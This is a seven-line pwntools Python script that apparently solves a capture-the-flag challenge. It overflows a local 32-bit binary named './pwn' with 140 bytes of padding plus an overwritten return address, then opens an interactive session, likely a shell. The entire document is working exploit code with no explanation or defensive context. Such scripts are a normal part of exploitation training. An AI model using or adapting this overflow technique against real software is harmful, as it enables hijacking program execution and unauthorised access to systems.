from pwn import*
p=process('./pwn')
garbage=b'a'*140
address=p32(0x080484ad)
payload=garbage+address
p.sendline(payload)
p.interactive()
